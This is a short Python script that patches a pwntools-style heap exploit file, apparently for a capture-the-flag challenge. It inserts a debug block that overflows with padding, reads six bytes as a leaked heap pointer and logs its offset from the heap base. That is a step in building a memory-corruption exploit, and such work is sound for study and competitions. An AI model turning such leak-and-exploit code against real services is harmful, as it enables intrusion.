p=r"./_z_55\_z_sc55_pwn.py"
s=open(p,encoding="utf-8").read()
old="        buy(0x48, data)"
new=("        buy(0x48, data)\n"
     "        if os.environ.get('LEAKGEO') and made == 0:\n"
     "            o = reintro(b'B' * 0x100)\n"
     "            ptr = o[0x120:0x126]\n"
     "            log.warning('LEAKGEO creams[4] raw=%r -> %#x (heap=%#x, delta=%#x)' %\n"
     "                        (ptr, u64(ptr + b'\\x00\\x00') if len(ptr) == 6 else 0,\n"
     "                         heap, (u64(ptr + b'\\x00\\x00') - heap) if len(ptr) == 6 else 0))\n"
     "            return None")
assert old in s
s=s.replace(old,new,1)
open(p,"w",encoding="utf-8").write(s)
print("ok")
